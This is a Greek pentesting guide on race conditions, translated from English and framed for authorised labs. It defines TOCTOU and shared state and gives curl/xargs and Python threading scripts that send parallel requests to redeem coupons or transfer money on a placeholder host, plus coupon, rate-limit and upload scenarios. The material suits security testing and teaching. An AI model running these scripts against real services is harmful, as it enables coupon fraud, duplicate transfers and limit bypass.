## Πριν ξεκινήσετε

Μια **συνθήκη ανταγωνισμού (race condition)** εμφανίζεται όταν το αποτέλεσμα εξαρτάται από τη σειρά ή την επικάλυψη ενεργειών. Για παράδειγμα, δύο αιτήματα μπορεί να ελέγξουν το ίδιο υπόλοιπο πριν ενημερωθεί η κοινή κατάσταση.

**Βασικοί όροι:** concurrency = ταυτόχρονες εργασίες, shared state = κοινή κατάσταση, atomic operation = ενέργεια που εκτελείται ως ενιαία μονάδα, TOCTOU = διάστημα μεταξύ ελέγχου και χρήσης. Μετρήστε την τελική κατάσταση και συγκρίνετε με τον προβλεπόμενο κανόνα της εφαρμογής.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

## 🎯 Τι είναι οι συνθήκες ανταγωνισμού

**Συνθήκες ανταγωνισμού (race conditions)** εμφανίζονται όταν η αλληλεπίδραση ταυτόχρονων ενεργειών επιτρέπει μη αναμενόμενο αποτέλεσμα, π.χ. μεταξύ ελέγχου και χρήσης μιας τιμής.

### Επίπτωση
- 💰 **Οικονομική κατάχρηση** — πολλαπλές εξαργυρώσεις
- 🎫 **Κατάχρηση κουπονιών** — πολλαπλή εξαργύρωση ίδιου κωδικού
- 👤 **Κλιμάκωση προνομίων** — παράκαμψη ελέγχων
- 📂 **Αντικατάσταση αρχείων** — περιπτώσεις TOCTOU

## 💉 Τεχνικές επαλήθευσης αδυναμιών

> **Παράλληλα δεν σημαίνει απόλυτα ταυτόχρονα:** Νήματα και xargs δεν εγγυώνται κοινό χρόνο άφιξης. Το παράδειγμα Turbo Intruder χρειάζεται έλεγχο του API της εγκατεστημένης έκδοσης, ιδιαίτερα της υπογραφής handleResponse. Τα 200 δεν αρκούν· επιβεβαιώστε αλλαγή κατάστασης ή παραβίαση πραγματικού ορίου. Δείτε τον [οδηγό race conditions](https://portswigger.net/web-security/race-conditions).

### Παράλληλα αιτήματα με curl
```bash
# Αποστολή 20 παράλληλων αιτημάτων
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Με δεδομένα POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Παράλληλα νήματα Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Εκκίνηση όλων των νημάτων, χωρίς εγγύηση ταυτόχρονης άφιξης
for t in threads:
    t.start()

for t in threads:
    t.join()
```

## 📊 Συνηθισμένα σενάρια

### Ταυτόχρονη εξαργύρωση κουπονιού
```
1. Κουπόνι = έκπτωση 50%
2. Αναμενόμενος κανόνας: μία εξαργύρωση
3. Δοκιμή: 10 ταυτόχρονες εξαργυρώσεις
4. Πιθανό αποτέλεσμα σε ευάλωτη εφαρμογή: 10 παραγγελίες με έκπτωση 50%
```

### Υπέρβαση ορίου μέσω ταυτόχρονων ενεργειών
```
1. Όριο: 3 λήψεις ανά ημέρα
2. Δοκιμή: 10 αιτήματα λήψης ταυτόχρονα
3. Οι έλεγχοι γίνονται πριν ενημερωθεί κοινή κατάσταση
4. Πιθανό αποτέλεσμα: ολοκλήρωση και των 10 λήψεων πριν εφαρμοστεί το όριο
```

### Race condition σε μεταφόρτωση αρχείου (TOCTOU)
```
1. Μεταφόρτωση αρχείου και αρχικός έλεγχος ασφάλειας
2. Αντικατάσταση του αρχείου στο διάστημα πριν από τη μετακίνησή του
3. Σε ευάλωτη υλοποίηση, ο server μετακινεί το διαφορετικό αρχείο
```
